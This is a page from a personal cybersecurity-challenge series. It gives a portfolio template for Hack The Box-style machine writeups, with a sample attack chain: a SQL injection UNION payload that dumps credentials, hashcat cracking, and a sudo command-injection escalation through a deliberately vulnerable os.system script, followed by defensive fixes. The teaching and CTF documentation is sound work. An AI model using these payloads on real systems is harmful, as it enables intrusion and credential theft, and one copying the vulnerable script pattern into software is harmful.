# Day 097 - HTB / TryHackMe: Advanced Machine Writeup

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Portfolio Sprint | **Difficulty:** Advanced

---

## 🎯 Purpose

Advanced project writeup demonstrates:
- Technical depth (solve complex problems)
- Communication (explain clearly for audience)
- Problem-solving (methodology & iteration)
- Learning (document findings)

This writeup style wins interviews: "Tell me about a complex problem you solved"

---

## 📝 The Format

### Template: Advanced Hack The Box Writeup

```markdown
# Machine Name: [Name]

## Overview
- Difficulty: [Hard/Medium/Easy]
- OS: [Linux/Windows]
- IP: [IP]
- Key Skills: [List]
- Time: [Hours spent]

## Reconnaissance

### Nmap Scan
[Actual commands + results]

Key Findings:
├─ Port 22: SSH (OpenSSH 7.6)
├─ Port 80: HTTP (nginx 1.14)
└─ Port 443: HTTPS (nginx 1.14)

### HTTP Enumeration

curl http://[IP]
- Homepage: Standard nginx page (not vulnerable)
- Directory enumeration (gobuster)
  ├─ /admin
  ├─ /config
  ├─ /backup
  └─ /api

### HTTPS Enumeration

Certificate Analysis:
- Subject: CN=machine.htb
- Valid: Jan 1 - Dec 31 2024

## Initial Access

### SQL Injection Discovery

Found at: /api/users?id=1

Vulnerable parameter: `id`

```
GET /api/users?id=1' OR '1'='1
```

Response: All users returned (confirms SQLi)

### Exploitation

Union-based SQL injection:
```
GET /api/users?id=1' UNION SELECT username,password,null FROM accounts--
```

Result:
```
admin:hash_123
user:hash_456
```

### Credential Cracking

Hashcat:
```bash
hashcat -m 1400 hashes.txt rockyou.txt --potfile-path=found.pot
```

Cracked:
- admin:SecurePassword2024!
- user:password123

## Privilege Escalation

### Initial Access
SSH as user:
```bash
ssh user@[IP]
# Password: password123
```

### Enumeration

Sudo capabilities:
```bash
sudo -l
```

Output:
```
User user may run the following commands on machine:
    (root) NOPASSWD: /usr/bin/python3 /opt/script.py
```

### Python Script Analysis

File: /opt/script.py
```python
import os
import sys

# Vulnerable code - uses user input directly
command = sys.argv[1]
os.system(command)
```

Vulnerability: Command injection via unsanitized input

### Exploitation

```bash
sudo /usr/bin/python3 /opt/script.py "id; cat /root/flag.txt"
```

Result:
```
uid=0(root) gid=0(root) groups=0(root)
HTB{[FLAG]}
```

## Key Learnings

1. **SQL Injection**: Union-based vs. blind injection
2. **Privilege Escalation**: Sudo misconfiguration is critical
3. **Code Injection**: Never trust user input, always sanitize
4. **Methodology**: Enumerate thoroughly before exploiting

## Defense Recommendations

1. **Input Validation**
   ```python
   # Bad
   query = f"SELECT * FROM users WHERE id={user_input}"
   
   # Good
   query = "SELECT * FROM users WHERE id=?"
   connection.execute(query, (user_input,))
   ```

2. **Principle of Least Privilege**
   ```bash
   # Bad: NOPASSWD on arbitrary commands
   user ALL=(root) NOPASSWD: /usr/bin/python3 /opt/script.py
   
   # Better: Specific arguments only
   user ALL=(root) NOPASSWD: /usr/bin/python3 /opt/script.py verify_config
   ```

3. **Secure Coding**
   - Use parameterized queries (prevent SQLi)
   - Use subprocess.run with shell=False (prevent injection)
   - Input validation (whitelist allowed values)
   - Output encoding (prevent XSS)

## Timeline

- Day 1: Reconnaissance (3 hours)
- Day 2: Initial access via SQLi (2 hours)
- Day 3: Privilege escalation (1 hour)
- Day 4: Writeup documentation (2 hours)
- Total: 8 hours

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)

---

## Interview Questions This Demonstrates

1. "Tell me about a complex problem you solved"
   → SQLi + PrivEsc chain

2. "How do you approach a new system you've never seen?"
   → Methodology (recon → access → escalation)

3. "What was the most interesting vulnerability you found?"
   → Command injection in Python script

4. "How would you defend this?"
   → Input validation, least privilege, secure coding

5. "What did you learn from this?"
   → Security principles, defense strategies
```

---

## 📊 Advanced Writeup Quality Metrics

**Poor Writeup:**
- "I did nmap and found SSH"
- "I ran sqlmap and got admin password"
- "I escalated to root"
- No explanation, no learning

**Good Writeup:**
- Clear methodology
- Show commands & output
- Explain vulnerabilities
- Defense recommendations

**Excellent Writeup:**
- Clear methodology with reasoning
- Show failures + iterations (how you overcame)
- Deep technical explanation
- Defensive strategies + code examples
- Timeline + effort breakdown
- Learning & reflection

**Your writeups should be:** Excellent level

---

## 🎯 How to Structure

```
1. Overview (1 paragraph)
   ├─ Problem statement
   ├─ Difficulty level
   └─ Key skills required

2. Reconnaissance (2-3 pages)
   ├─ Nmap scans + analysis
   ├─ Service enumeration
   ├─ Vulnerability research
   └─ Attack surface mapping

3. Exploitation (3-5 pages)
   ├─ Vulnerability details
   ├─ Proof of concept
   ├─ Actual exploitation
   └─ Access achieved

4. Privilege Escalation (2-3 pages)
   ├─ Enumeration post-access
   ├─ Vulnerability identified
   ├─ Exploitation
   └─ Root access achieved

5. Learning & Defense (2-3 pages)
   ├─ Vulnerabilities summary
   ├─ Why each was critical
   ├─ How to fix
   └─ Code examples

6. Reflection (1 page)
   ├─ What took longest?
   ├─ What surprised you?
   ├─ What would you do differently?
   └─ Interview questions it addresses
```

---

## 💡 For Your Portfolio

Do this for your best HTB/TryHackMe machines:

1. **Intermediate Machine** (1-2 vulnerabilities)
   - ~2000 words
   - Demonstrates solid fundamentals

2. **Advanced Machine** (3+ vulnerabilities, privilege escalation)
   - ~5000 words
   - Demonstrates deep technical skill
   - **This is interview gold**

3. **Insane Machine** (if you complete)
   - ~8000 words
   - Demonstrates expert-level thinking
   - Rare + valued

**Strategy:** Do 1 excellent writeup per month for your best machines.

After 3 months: 3 advanced writeups in portfolio.

Recruiters see: "This person consistently solves hard problems + explains well"

---

## 🔑 Key Takeaways

- **Writeups are teaching documents** - explain for audience, not yourself
- **Show your process** - failures matter as much as successes
- **Provide defense** - offense + defense = complete understanding
- **Reflective learning** - what did you learn?
- **Interview prep** - each writeup is interview answer
- **Portfolio quality** - 1 excellent writeup > 10 mediocre ones

---

## [⬅️ Day 096](../day096/) | [➡️ Day 098](../day098/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*

**Advanced writeups are portfolio gold.**